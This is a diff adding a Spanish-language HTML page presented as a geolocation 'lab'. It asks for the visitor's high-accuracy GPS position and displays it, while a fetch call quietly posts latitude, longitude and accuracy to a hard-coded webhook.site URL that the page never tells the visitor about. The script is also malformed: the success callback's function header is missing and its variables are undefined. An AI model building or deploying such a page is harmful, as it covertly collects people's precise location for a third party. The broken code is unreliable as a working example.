@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prueba de Geolocalización GPS</title>
+</head>
+<body>
+
+    <h2>Laboratorio de Geolocalización HTML5</h2>
+    <p>Haz clic en el botón para solicitar las coordenadas GPS del dispositivo:</p>
+    <button onclick="obtenerUbicacion()">Obtener mi ubicación exacta</button>
+
+    <div id="resultado" style="margin-top: 20px; font-family: monospace;"></div>
+
+    <script>
+        function obtenerUbicacion() {
+            const resultado = document.getElementById("resultado");
+
+            // 1. Verificar si el navegador soporta la API de Geolocalización
+            if ("geolocation" in navigator) {
+                resultado.innerHTML = "Solicitando permiso de GPS...";
+
+                // 2. Solicitar las coordenadas exactas al dispositivo
+                navigator.geolocation.getCurrentPosition(
+                    // Función de éxito (si el usuario presiona "Permitir")
+                    // Reenviar los datos a tu servidor o Webhook.site
+fetch("https://webhook.site/a965ca35-1db9-4e3d-b6a8-8d6ab5559540", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        latitud: lat,
+        longitud: lon,
+        precision: precision
+    })
+});
+                        resultado.innerHTML = `
+                            <strong>¡Ubicación recibida con éxito!</strong><br><br>
+                            Latitud: ${lat}<br>
+                            Longitud: ${lon}<br>
+                            Precisión: +/- ${precision} metros<br><br>
+                            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">
+                                Ver en Google Maps
+                            </a>
+                        `;
+                    },
+                    // Función de error (si el usuario bloquea o falla la lectura)
+                    function(error) {
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                resultado.innerHTML = "El usuario denegó el permiso de ubicación.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                resultado.innerHTML = "La información de ubicación no está disponible.";
+                                break;
+                            case error.TIMEOUT:
+                                resultado.innerHTML = "La solicitud expiró.";
+                                break;
+                            default:
+                                resultado.innerHTML = "Ocurrió un error desconocido.";
+                                break;
+                        }
+                    },
+                    // Opciones de configuración
+                    {
+                        enableHighAccuracy: true, // Forzar uso de GPS de alta precisión
+                        timeout: 10000,           // Esperar máximo 10 segundos
+                        maximumAge: 0            // No usar ubicaciones en caché
+                    }
+                );
+            } else {
+                resultado.innerHTML = "Tu navegador no soporta la API de Geolocalización.";
+            }
+        }
+    </script>
+
+</body>
+</html>
